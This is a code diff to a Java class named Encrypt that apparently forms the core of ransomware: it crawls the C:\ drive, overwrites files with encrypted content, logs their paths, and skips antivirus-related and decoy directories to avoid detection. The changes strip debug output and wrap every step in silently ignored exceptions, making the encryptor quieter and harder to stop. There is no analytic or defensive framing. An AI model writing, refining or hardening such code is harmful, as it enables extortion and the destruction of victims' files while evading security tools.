@@ -4,7 +4,6 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
 import java.io.FileWriter;
-import java.nio.file.FileSystemException;
 import java.nio.file.Files;
 import java.util.*;
 
@@ -22,7 +21,7 @@ public class Encrypt {
             "Estsoft"
     };
 
-    public static void runEncryption() throws Exception {
+    public static void runEncryption() {
         List<File> filesToEncrypt = new ArrayList<>();
         File root = new File("C:\\");
 
@@ -37,8 +36,7 @@ public class Encrypt {
             try {
                 encryptFile(file);
                 encryptedFiles.add(file.getAbsolutePath());
-            } catch (FileSystemException ignored) {
-//                System.out.println("FileSystemException = " + e.getFile());
+            } catch (Exception ignored) {
             }
         }
 
@@ -47,6 +45,7 @@ public class Encrypt {
             for (String filePath : encryptedFiles) {
                 writer.write(filePath + System.lineSeparator());
             }
+        } catch (Exception ignored) {
         }
     }
 
@@ -61,13 +60,11 @@ public class Encrypt {
 
         for (String keyword : EXCLUDED_KEYWORDS) {
             if (dirPath.toLowerCase().contains(keyword.toLowerCase())) {
-                System.out.println("AntiVirusDir : " + dirPath);
                 return;
             }
         }
 
         if (dirPath.matches(".*[^a-zA-Z0-9\\\\\\/: \\-_.()\\[\\]{}~\\uAC00-\\uD7AF].*")) {
-            System.out.println("DecoyDir : " + dirPath);
             return;
         }
 
@@ -89,9 +86,12 @@ public class Encrypt {
     }
 
     private static void encryptFile(File file) throws Exception {
-        byte[] fileContent = Files.readAllBytes(file.toPath());
-        byte[] encryptedContent = encrypt(fileContent);
-        Files.write(file.toPath(), encryptedContent);
+        try {
+            byte[] fileContent = Files.readAllBytes(file.toPath());
+            byte[] encryptedContent = encrypt(fileContent);
+            Files.write(file.toPath(), encryptedContent);
+        } catch (Exception ignored) {
+        }
     }
 
     private static byte[] encrypt(byte[] data) throws Exception {
